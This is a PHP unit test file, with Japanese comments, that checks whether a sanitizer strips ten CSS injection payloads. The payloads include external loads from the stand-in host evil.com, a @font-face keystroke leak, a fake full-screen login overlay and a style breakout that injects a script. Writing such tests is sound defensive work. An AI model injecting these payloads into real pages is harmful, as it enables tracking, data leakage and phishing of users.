<?php
/**
 * Suite 5: CSSインジェクション テスト — 10件
 *
 * 使い方: php test/unit/tiptap-security/backend/test_css_injection.php
 */
require_once __DIR__ . '/SecurityTestRunner.php';

$runner = new SecurityTestRunner();

// === Suite 5: CSSインジェクション (5-01〜5-10) ===
$runner->addCase('5-01', '<style>body{display:none}</style>', 'css_injection', 'REMOVED');
$runner->addCase('5-02', '<div style="@import url(\'https://evil.com/evil.css\')">', 'css_injection', 'REMOVED');
$runner->addCase('5-03', '<div style="background-image:url(\'https://evil.com/track.gif\')">', 'css_injection', 'REMOVED');
$runner->addCase('5-04', '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">偽ログイン画面</div>', 'css_injection', 'REMOVED');
$runner->addCase('5-05', '<div style="display:none">hidden</div><div style="opacity:0">invisible</div>', 'css_injection', 'REMOVED');
$runner->addCase('5-06', '<div style="list-style-image:url(\'https://evil.com/track.gif\')">', 'css_injection', 'REMOVED');
$runner->addCase('5-07', '<div style="color:var(--evil-color)">text</div>', 'css_injection', 'REMOVED');
$runner->addCase('5-08', '<div style="width:calc(100vw - 1px)">text</div>', 'css_injection', 'REMOVED');
$runner->addCase('5-09', '<span style="font-family:\';</style><script>alert(1)</script>">', 'css_injection', 'REMOVED');
$runner->addCase('5-10', '<style>@font-face{font-family:x;src:url(https://evil.com/f);unicode-range:U+0041}</style>', 'css_injection', 'REMOVED');

// テスト実行
$runner->testFullPipeline();
$runner->printReport();
$runner->saveResultJson(__DIR__ . '/result_css_injection.json');
exit($runner->hasFailures() ? 1 : 0);
